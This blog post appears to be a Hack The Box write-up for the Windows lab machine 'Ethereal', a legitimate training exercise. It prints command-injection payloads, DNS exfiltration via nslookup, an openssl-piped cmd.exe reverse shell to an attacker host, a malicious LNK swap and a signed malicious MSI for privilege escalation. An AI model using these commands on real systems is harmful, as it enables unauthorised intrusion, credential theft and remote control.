---
layout: post
title: Hack The Box - Ethereal
categories: hack-the-box
tags: [Windows, ftp, Web, RCE, Windows Exploitation, firewall, Networking]
image: /hackthebox/ethereal/0.png
---
<hr>
### Quick Summary
#### Hey guys today Ethereal retired and here is my write-up about it. And as the difficulty says , It's insane ! The most annoying part about this box is that it was very hard to enumerate because we only get a blind RCE and the firewall rules made it even harder because it only allowed TCP connection for 2 ports. It was fun and annoying at the same time but I liked it. It's a Windows box and its ip is 10.10.10.106 I added it to `/etc/hosts` as `ethereal.htb` , Let's jump right in !
![](/images/hackthebox/ethereal/0.png)
<hr>
### Nmap
#### As always we will start with nmap to scan for open ports and services : 
`nmap -sV -sT -sC ethereal.htb`
![](/images/hackthebox/ethereal/1.png)
#### And we get FTP on port 21 , HTTP on port 80 and 8080. It also tells us that FTP anonymous authentication is allowed. As always we will enumerate HTTP first.
<br>
<hr>
### HTTP Initial Enumeration
#### On port 80 we see this website :
![](/images/hackthebox/ethereal/2.png)
#### The only interseting thing is in the menu we see an Admin-area :
![](/images/hackthebox/ethereal/3.png)
#### Clicking on that we get redirected to this page which has some other options like Notes , Messages , Desktop and Ping :
![](/images/hackthebox/ethereal/4.png)
#### By going to `notes` we only get this :
![](/images/hackthebox/ethereal/5.png)
#### So now we know that there's a "test connection" page somewhere , we also get a potential username `alan`. By clicking on `messages` we get nothing , but `desktop` :
![](/images/hackthebox/ethereal/6.png)
#### And it's very clear that this is fake , also the user.txt is a troll :
![](/images/hackthebox/ethereal/7.png)
#### By clicking on `ping` we get redirected to port 8080 which asks us for authentication and it uses http basic auth :
![](/images/hackthebox/ethereal/8.png)
#### So now we know what's on port 8080 , the "Test Connection" page. But we need credentials to access it.
#### One more thing to check is sub directory enumeration with gobsuter or any alternative :
```
gobuster -u http://ethereal.htb -w /usr/share/wordlists/dirb/common.txt -t 100 -to 250s 
=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://ethereal.htb/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 4m10s
=====================================================
2019/03/06 21:51:24 Starting gobuster
=====================================================
/corp (Status: 301)
```
#### gobuster only found `/corp` with the wordlist `/usr/share/wordlists/dirb/common.txt` and that's the subdirectory that had the admin stuff. We can't get any more info and there's nothing to exploit so next thing to look at is FTP
<br>
<hr>
### FTP Enumeration
#### On FTP there are some files but the most interesting ones are `FDISK.zip` and `DISK.zip` so we will check them first :
![](/images/hackthebox/ethereal/9.png)
#### We will `unzip` them :
![](/images/hackthebox/ethereal/10.png)
#### Then we will check what kind of files do we have with `file` :
![](/images/hackthebox/ethereal/11.png)
#### Most likely they are mountable disks so we will create a directory to mount them and call it `mnt` then we will make a directory for `disk1` , `disk2` and `fdisk` and finally we will mount them `mount -o loop [Disk] [Directory]` : 
![](/images/hackthebox/ethereal/12.png)
#### In `disk1` and `disk2` there are some files that are not very interesting :
![](/images/hackthebox/ethereal/13.png)
<br>
<br>
![](/images/hackthebox/ethereal/14.png)
#### But on fdisk there's a directory called `pbox` :
![](/images/hackthebox/ethereal/15.png)
#### It contains an executable called `pbox.exe` and a dat file called `pbox.dat` :
![](/images/hackthebox/ethereal/16.png)
<hr>
### Getting Credentials 
#### We will switch to a windows box to run that executable , you can alternatively use `wine` or a program called `dosbox`. `wine` didn't work for me and `dosbox` kept crashing every 15 seconds.
![](/images/hackthebox/ethereal/17.png)
#### When we try to open it it asks for a password : 
![](/images/hackthebox/ethereal/18.png)
#### At this point the only option I had was to guess the password because I didn't know how to bruteforce the password in this case , however the password was "password" :D , so no bruteforce is needed it's only a quick guess , after we get in , we see this password database :
![](/images/hackthebox/ethereal/19.png)
#### databases :
![](/images/hackthebox/ethereal/20.png)
#### msdn :
![](/images/hackthebox/ethereal/21.png)
#### learning :
![](/images/hackthebox/ethereal/22.png)
#### ftp drop :
![](/images/hackthebox/ethereal/23.png)
#### backup :
![](/images/hackthebox/ethereal/24.png)
#### website uploads :
![](/images/hackthebox/ethereal/25.png)
#### truecrypt :
![](/images/hackthebox/ethereal/26.png)
#### management server :
![](/images/hackthebox/ethereal/27.png)
#### svn : 
![](/images/hackthebox/ethereal/28.png)
#### Back to our kali , now we can create a list with all the information we got :
![](/images/hackthebox/ethereal/29.png)
#### I put the passwords in a separate list to bruteforce the http auth with it :
![](/images/hackthebox/ethereal/30.png)
#### We will use `wfuzz` and we will try the username `alan` first :
`wfuzz -u http://ethereal.htb:8080 --basic alan:FUZZ -w passwords.txt`
![](/images/hackthebox/ethereal/31.png)
#### Password : `!C414m17y57r1k3s4g41n!`
<br>
<hr>
### Blind RCE
#### Now after we login we get the "Test Connection" page and we have an input for the ip address to ping. 
![](/images/hackthebox/ethereal/32.png)
#### Now we can try to bypass that and inject system commands using `&` or `|` , but we don't get any output. I also tried to host `nc.exe` on a python http server and used `certutil` to download it but the python server didn't get any requests. Finally when I ran responder `responder -I tun0` then did this `10.10.xx.xx & nslookup test 10.10.xx.xx`
![](/images/hackthebox/ethereal/33.png)
#### I finally got something :
![](/images/hackthebox/ethereal/34.png)
#### We can try to execute a system command and get the output by doing this :
`10.10.xx.xx & for /f %i in ('whoami') do nslookup %i 10.10.xx.xx`
![](/images/hackthebox/ethereal/35.png)
#### This is executing `whoami` then taking the output and doing nslookup with the output to our ip :
![](/images/hackthebox/ethereal/36.png)
#### We get `etherealalan` and that's unusual as we expected `ethereal\alan`.
#### We will start enumerating the filesystem this way , [read this](https://ss64.com/nt/for_f.html) if you don't understand some of the `for` commands that we will use.
`10.10.xx.xx & for /f %i in ('cd') do nslookup %i 10.10.xx.xx`
![](/images/hackthebox/ethereal/37.png)
<br>
<br>
![](/images/hackthebox/ethereal/38.png)
#### So the current directory is `c:\windows\system32\inetsrv`
#### We also need to know the users on the box :
`10.10.xx.xx & for /f "tokens=1,2,3" %a in ('dir /B "C:\Users"') do nslookup %a.%b.%c 10.10.xx.xx`
![](/images/hackthebox/ethereal/39.png)
#### We have 5 users on the box `alan` , `jorge` , `Public` , `rupal` and `Administrator`. We are executing commands as `alan`
#### Next thing to look at is the installed programs :
`10.10.xx.xx & for /f "tokens=1,2,3" %a in ('dir /B "C:\Program Files (x86)"') do nslookup %a.%b.%c 10.10.xx.xx` 
![](/images/hackthebox/ethereal/40.png)
#### We notice that OpenSSL is installed which is unusual , we also need to know why can't we make the box connect back to us so we will check the firewall rules. In our case the easiest way to do this is to execute the command and only look for the string `Rule Name:` then redirect that output to a file , and read that file like we  are doing. But first we need to find a place that we can write to. After some attempts I could write to `c:\users\public\desktop\shortcuts` , so we will do this :
`10.10.xx.xx & netsh advfirewall firewall show rule name=all | findstr "Rule Name:" > C:\Users\Public\Desktop\Shortcuts\firewall.txt`
#### Then we will list the contents of `c:\users\public\desktop\shortcuts` 
`10.10.xx.xx & for /f "tokens=1,2,3" %a in ('dir /B "C:\Users\Public\Desktop\Shortcuts"') do nslookup %a.%b.%c 10.10.xx.xx`
![](/images/hackthebox/ethereal/41.png)
#### And we see that we have successfully written into that directory , next step is to read the file :
`10.10.xx.xx & for /f "tokens=1,2,3,4,5,6,7" %a in ('type C:\Users\Public\Desktop\Shortcuts\firewall.txt') do nslookup %a.%b.%c.%d.%e.%f.%g 10.10.xx.xx`
![](/images/hackthebox/ethereal/42.png)
#### It's only allowing TCP conections to port `73` and `136` , we saw earlier that openssl was installed on the box , we can create a `SSL/TLS server` on these ports and use openssl to make the box connect back to us.
<br>
<hr>
### Generating certs and setting up the server
#### First step is to generate certificates because we need them to set up the server
`openssl req -x509 -newkey rsa:4096 -keyout key.pem -out certificate.pem -days 365 -nodes`
![](/images/hackthebox/ethereal/43.png)
#### Then we will split our terminal and run 2 servers , one on port 73 and the other on port 136 
`openssl s_server -key key.pen -cert certificate.pem -quiet -port [port]`
![](/images/hackthebox/ethereal/44.png)
#### [Read more about s_server](https://www.openssl.org/docs/man1.0.2/man1/openssl-s_server.html)
#### We are setting up 2 servers because we are going to use openssl on the box to connect on port 73 and take our input , then we will pipe that input to cmd.exe then we will pipe the output to our server on port 136.
#### Now we need to locate openssl.exe , if we listed the contents of `OpenSSL-v1.1.0` in `Program Files (x86)` (can also be written `Progra~2`. check [this](https://stackoverflow.com/questions/892555/how-do-i-specify-c-program-files-without-a-space-in-it-for-programs-that-cant/892568)) we will get this output :
`10.10.xx.xx & for /f "tokens=1,2,3" %a in ('dir /B "C:\Program Files (x86)\OpenSSL-v1.1.0"') do nslookup %a.%b.%c 10.10.xx.xx`
![](/images/hackthebox/ethereal/45.png)
#### We see a directory called `bin` that's where `openssl.exe` is located so the path is `c:\progra~2\OpenSSL-v1.1.0\bin\openssl.exe`
#### Now everything is ready , in the ping page we will write this :
`10.10.xx.xx | "C:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -quiet -connect 10.10.xx.xx:73 | cmd.exe | "C:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -quiet -connect 10.10.xx.xx:136`
#### Then we will check our server :
![](/images/hackthebox/ethereal/46.png)
#### Now we will write the commands on the first server (port 73) , then we will refresh the ping page , to send the post request again (this will pipe our input from port 73 to cmd.exe then to the server on port 136) then we will get our output on the second server.
![](/images/hackthebox/ethereal/47.png)
<br>
<br>
![](/images/hackthebox/ethereal/48.png)
<br>
<br>
![](/images/hackthebox/ethereal/49.png)
#### alan's desktop doesn't have the flag so we need to escalate to another user , there's a note on alan's desktop in a file called `note-draft.txt`:
![](/images/hackthebox/ethereal/50.png)
<hr>
### Creating a malicious lnk and getting User
![](/images/hackthebox/ethereal/51.png)
#### From the note we knew that there's a lnk on Public's desktop and other users on the box are using it.
![](/images/hackthebox/ethereal/52.png)
#### So if we replaced it with a payload we can get a shell as another user. There's a tool on github called [LNKup](https://github.com/Plazmaz/LNKUp) I used it to create the payload :
![](/images/hackthebox/ethereal/53.png)
#### To uplaod it we will close any one of the servers and run it again but this time we will redirect the lnk file to it :
![](/images/hackthebox/ethereal/54.png)
#### Then on the ping page we will type this :
`10.10.xx.xx | "C:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -quiet -connect 10.10.xx.xx:136 > "C:\Users\Public\Desktop\Shortcuts\rick.lnk"`
#### We will close the server , run the 2 servers and get our shell as alan like we did before , then we will delete the original lnk and copy ours with the name of the old lnk :
![](/images/hackthebox/ethereal/55.png)
<br>
<br>
`del "c:\users\public\desktop\shortcuts\Visual Studio 2017.lnk" & copy "c:\users\public\desktop\shortcuts\rick.lnk" "c:\users\public\desktop\shortcuts\Visual Studio 2017.lnk" & dir c:\users\public\desktop\shortcuts`
![](/images/hackthebox/ethereal/56.png)
#### Then we will close the 2 servers , run them again and wait for someone to execute the lnk file , after a minute we will get a shell as jorge :
![](/images/hackthebox/ethereal/57.png)
#### With this we don't need to refresh any pages because the connection is not handled by the ping page anymore so the command will be piped immediately from the first server to the second server.
![](/images/hackthebox/ethereal/58.png)
#### Finally we owned user !
<br>
<hr>
### More Filesystem Enumeration
#### If we checked the other drives : 
`fsutil fsinfo drives`
![](/images/hackthebox/ethereal/59.png)
#### We will find that `C` is not the only drive and there's also `D`.
#### Unfortunately if someone started to enumerate without doing this important step in windows enumeration , they won't get anything.
#### Contents of `D`:
![](/images/hackthebox/ethereal/60.png)
#### In `DEV` there's a directory called `MSIs` and it has a note :
![](/images/hackthebox/ethereal/61.png)
#### So we have to create a malicious msi and place it there to get a shell as rupal. We also need to get the certs to sign the msi , the certs are found in `D:\Certs` , `MyCA.cer` and `MyCA.pvk` , to transfer them to our box we will use `openssl` to base64 encode the certs then we can copy and decode on our box.
`C:\progra~2\OpenSSL-v1.1.0\bin\openssl.exe base64 -in MyCA.cer`
![](/images/hackthebox/ethereal/62.png)
`C:\progra~2\OpenSSL-v1.1.0\bin\openssl.exe base64 -in MyCA.pvk`
![](/images/hackthebox/ethereal/63.png)
#### Now we will go to a windows box again to create the msi 
<br>
<hr>
### Creating Malicious msi and getting root
#### In order to create the msi we will use [wixtools](http://wixtoolset.org/) , you can use other msi builders but they didn't work for me.
#### Check [this page](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) for some wix msi usage examples.
#### We will create an msi that executes our lnk file :
![](/images/hackthebox/ethereal/64.png)
```
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix> 
```
#### We will use `candle.exe` from wixtools to create a wixobject from `msi.xml`
![](/images/hackthebox/ethereal/65.png)
#### Then we will use `light.exe` to create the msi file from the wixobject 
![](/images/hackthebox/ethereal/66.png)
#### After that we need tools from microsoft sdk to sign our msi , first we will use `makecert.exe` to create new certs from the original certs we got from the box 
`makecert.exe -n "CN=Ethereal" -pe -cy end -ic c:\tmp\MyCA.cer -iv c:\tmp\MyCA.pvk -sky signature -sv c:\tmp\rick.pvk c:\tmp\rick.cer`
#### It will ask for a password we will leave it blank for no password protection :
![](/images/hackthebox/ethereal/67.png)
<br>
<br>
![](/images/hackthebox/ethereal/68.png)
<br>
<br>
![](/images/hackthebox/ethereal/69.png)
#### Then we will use `pvk2pfx.exe` to create a pfx for both the cer and the pvk files. 
`pvk2pfx.exe -pvk c:\tmp\rick.pvk -spc c:\tmp\rick.cer -pfx c:\tmp\rick.pfx`
#### And finally we will use `signtool.exe` to sign the msi with the pfx 
`signtool.exe sign /f c:\tmp\rick.pfx c:\tmp\ethereal\rick.msi`
![](/images/hackthebox/ethereal/70.png)
#### Now back to our kali we will upload the msi the same way we uploaded the lnk file before , and we also need to make sure that the lnk file is in `c:\users\public\desktop\shortcuts\` because the msi is just executing that lnk. We will put the msi into `D:\DEV\MSIs`
![](/images/hackthebox/ethereal/71.png)
#### Then we will close the servers , run them again and wait for around 3-5 minutes until rupal opens the msi
![](/images/hackthebox/ethereal/72.png)
#### And we got root !
<br>
<br>
#### That's it , Feedback is appreciated !
#### Don't forget to read the [previous write-ups](/categories) , Tweet about the write-up if you liked it , follow on twitter for awesome resources [@Ahm3d_H3sham](https://twitter.com/Ahm3d_H3sham)
#### Thanks for reading.
<br>
<br>
#### Previous Hack The Box write-up : [Hack The Box - Access](/hack-the-box/access/)
#### Next Hack The Box write-up : [Hack The Box - Carrier](/hack-the-box/carrier/)
<hr>
